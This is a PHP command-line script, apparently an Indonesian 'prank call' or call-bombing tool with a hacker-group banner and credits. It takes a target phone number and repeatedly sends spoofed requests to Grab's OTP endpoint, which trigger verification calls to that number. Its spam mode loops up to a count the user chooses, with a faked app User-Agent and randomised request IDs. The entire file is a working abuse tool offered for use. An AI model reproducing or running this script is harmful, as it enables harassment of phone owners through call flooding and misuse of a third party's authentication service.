<?php 
// RECOD3 MATI LU BANNGSAT 
// Jangan Di recode ajg
// Coding By Root@Kandol
shell_exec('clear'); 
function get(){ 
return trim(fgets(STDIN)); } 
class prankcall{ 
public function __construct($no){ $this->
number = $no; } 
private function get(){ 
return trim(fgets(STDIN)); } 
private function correct($no){ $cek = substr($no,0,2); 
if($cek=="08"){ $no = "62".substr($no,1); 
} 
return $no; 
} 
private function ekse(){ $no = $this->correct($this->number); 
$rand = rand(0123456,9999999); 
$rands = $this->randStr(12); 
$post = "method=CALL&countryCode=id&phoneNumber=$no&templateID=pax_android_production"; 
$h[] = "x-request-id: ebf61bc3-8092-4924-bf45-$rands"; 
$h[] = "Accept-Language: in-ID;q=1.0, en-us;q=0.9, en;q=0.8"; 
$h[] = "User-Agent: Grab/5.20.0 (Android 6.0.1; Build $rand)"; 
$h[] = "Content-Type: application/x-www-form-urlencoded"; 
$h[] = "Content-Length: ".strlen($post); 
$h[] = "Host: api.grab.com"; 
$h[] = "Connection: close"; 
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, "https://api.grab.com/grabid/v1/phone/otp"); 
curl_setopt($ch, CURLOPT_POST, 1); 
curl_setopt($ch, CURLOPT_POSTFIELDS, $post); 
curl_setopt($ch, CURLOPT_HTTPHEADER, $h); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
$x = curl_exec($ch); curl_close($ch); 
$ekse = json_decode($x,true); 
if(empty($ekse['challengeID'])){ echo " [•] \e[1;31mMampus Gagal\n\n"; 
}
else
{ 
	echo " \e[1;32m[√] \e[1;93mSukses Bngsd\n\n"; 
	} 
	} 
	private function loop($many,$sleep=null){ $a=0; 
	$no = $this->correct($this->number); 
	while($a<$many){ $rand = rand(0123456,9999999); 
	$rands = $this->randStr(12); 
	$post = "method=CALL&countryCode=id&phoneNumber=$no&templateID=pax_android_production"; 
	$h[] = "x-request-id: ebf61bc3-8092-4924-bf45-$rands"; 
	$h[] = "Accept-Language: in-ID;q=1.0, en-us;q=0.9, en;q=0.8"; 
	$h[] = "User-Agent: Grab/5.20.0 (Android 6.0.1; Build $rand)"; 
	$h[] = "Content-Type: application/x-www-form-urlencoded"; 
	$h[] = "Content-Length: ".strlen($post); 
	$h[] = "Host: api.grab.com"; $h[] = "Connection: close"; 
	$ch = curl_init(); 
	curl_setopt($ch, CURLOPT_URL, "https://api.grab.com/grabid/v1/phone/otp"); 
	curl_setopt($ch, CURLOPT_POST, 1); 
	curl_setopt($ch, CURLOPT_POSTFIELDS, $post); 
	curl_setopt($ch, CURLOPT_HTTPHEADER, $h); 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
	$x = curl_exec($ch); curl_close($ch); 
	$ekse = json_decode($x,true); 
	if(empty($ekse['challengeID'])){ continue; 
	}
	else
	{ 
	$nn = $a+1; 
	echo "\e[1;32m [$nn] Call Sedang Otw\r"; 
	$a++; 
	} 
	if($sleep!=null) sleep($sleep); 
	if($a>=$many) 
	echo "\n \e[1;32m[√] \e[1;93mSelesai cok!\n\n"; 
	} 
	} 
	private function randStr($l){ $data = "abcdefghijklmnopqrstuvwxyz1234567890"; 
	$word = ""; 
	for($a=0;$a<$l;$a++){ $word .= $data{rand(0,strlen($data)-1)}; 
	} 
	return $word; 
	} 
	public function run(){ while(true){ echo " [+] Spam Mode? (y/n): "; 
	$loop = $this->get(); 
	if($loop=="y" OR $loop=="n"){ break; 
	}
	else
	{ echo "Jangan jail ea bangsad n\n"; 
	continue; 
	} 
	} 
	if($loop=="y"){ echo " [+] masukan Jumlah Spam: "; 
	$many = $this->get(); 
	$this->loop($many); 
	}
	else
	{ $this->ekse(); 
	} } } 
echo "=====================Root@Kandol=================\n" ;
echo "  _____                          _____      _ _  \n" ;                             
echo " / ____|                        / ____|    | | | \n" ;
echo "| (___  _ __   __ _ _ __ ___   | |     __ _| | | \n" ;
echo " \___ \| '_ \ / _` | '_ ` _ \  | |    / _` | | | \n" ;                             
echo " ____) | |_) | (_| | | | | | | | |___| (_| | | | \n" ;
echo "|_____/| .__/ \__,_|_| |_| |_|  \_____\__,_|_|_| \n" ;
echo "       | | \n" ;
echo "       |_| \n" ;                                                                   
echo "=====================Root@Kandol================= \n" ;
echo "                                                  \n" ;
echo " _  __           _   _ ____     ____   _          \n" ;
echo "| |/ /    /\    | \ | |  __ \ /  __ \ | |         \n" ;
echo "| ' /    /  \   |  \| | | |  \| | |  || |         \n" ;
echo "|  <    / /\ \  | . ` | | |  || | |  || |         \n" ;
echo "|  .\  / /__\ \ | | \ | |_|  || |_|  || |___      \n" ;
echo "|_|\_\/_/    \_\|_| \_|_____/ \_____/ |_____|     \n" ;
echo "                     \n " ;
echo "=====================Root@Kandol================= \n" ;
echo "   \n" ;
echo "Author    : Root./Kandol \n" ;
echo "contact   : Kandoljr701@gmail.com \n" ;
echo "version   : 1.0 \n" ;
echo " \n" ;
echo "thank Team : Ali Attacker Team \n" ;
echo "             Indonesian Fighter Cyber \n" ;
echo "             Indonesian Termux Asosian \n" ;
echo "             Manusia Biasa Team \n" ;
echo "             HaxorScurity \n" ;
echo "             Forum Indores \n" ;
echo "             Mouse Cyber Security \n" ;
echo "             SecurityDarknet \n" ;
echo "             Drak 3xploit Cyber \n" ;
echo "   \n" ;
echo "[====================Root@Kandol================= \n" ;
echo " \n" ; 
system ('echo'); 
sleep ('0.4'); 
echo " [+] No Target: "; 
$no = get(); 
$n = new prankCall($no); 
$n->run(); 
?>
    